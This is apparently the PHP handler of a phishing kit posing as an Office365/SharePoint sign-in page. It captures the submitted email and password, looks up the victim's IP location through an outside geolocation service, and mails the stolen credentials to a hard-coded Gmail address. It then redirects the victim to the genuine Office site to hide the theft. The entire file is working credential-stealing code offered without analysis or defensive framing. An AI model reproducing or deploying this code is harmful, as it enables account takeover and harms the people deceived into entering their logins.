<?php 

if(!empty($_POST['loginfmt']) || !empty($_POST['passwd'])){
	
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
	$remoteIP = $_SERVER["HTTP_CF_CONNECTING_IP"];
	} else {
	$remoteIP = $_SERVER['REMOTE_ADDR'];
	}
	$abi = curl_init();
	curl_setopt($abi, CURLOPT_URL, "http://ip-api.com/json/" . $remoteIP);
	curl_setopt($abi, CURLOPT_HEADER, 0);
	curl_setopt($abi, CURLOPT_RETURNTRANSFER, TRUE);
	$curlExec = curl_exec($abi);
	curl_close($abi);

	$IP_LOOKUP = json_decode($curlExec, true);
	$browser   = $_SERVER['HTTP_USER_AGENT'];
	$date      = date("D M d, Y g:i a");

	if ($IP_LOOKUP && $IP_LOOKUP['query'] != null) {
	// Target Geo Information
	$country     = $IP_LOOKUP['country'];
	$countrycode = $IP_LOOKUP['countryCode'];
	$state       = $IP_LOOKUP['regionName'];
	$city        = $IP_LOOKUP['city'];
	$postal      = $IP_LOOKUP['zip'];	
	$message  = "========+[Personal Info - Office365 #2]+==========\n";
	$message .= "Email Address : ".$_POST['loginfmt']."\n";
	$message .= "Password : ".$_POST['passwd']."\n";
	$message .= "============= [ Ip & Hostname Info ] =============\n";
	$message .= "Client IP : ".$remoteIP."\n";
	$message .= "User-Agent : ".$browser."\n";
	$message .= "--------------------------------------------\n";
	$message .= 	"City: ".$city."\n";
	$message .= 	"Region: ".$state."\n";
	$message .= 	"Country Name: ".$country."\n";
	$message .= 	"Country Code: ".$countrycode."\n";
	$message .= "=======+ [Office365] +========\n";
	}else{
	$message  = "=======+[Office365 #2]+=========\n";
	$message .= "Email Address : ".$_POST['loginfmt']."\n";
	$message .= "Password : ".$_POST['passwd']."\n";
	$message .= "==== [ Ip & User-Agent Info ] ======\n";
	$message .= "Client IP : ".$remoteIP."\n";
	$message .= "User-Agent : ".$browser."\n";
	$message .= "======+ [Office365] +========\n";

	}
	$email= "kbabone007@gmail.com";
	$subject = "Sharepoint Office365 Login ".$remoteIP;
	$data = $_POST['loginfmt'];
	mail($email,$subject,$message);
	header("Location: https://office.live.com/start/Excel.aspx");
}else{
	$data = $_POST['loginfmt'];
	header("Location: valid.php?email=$data&login=&13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&login=&loginpage=&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
	
}

?>



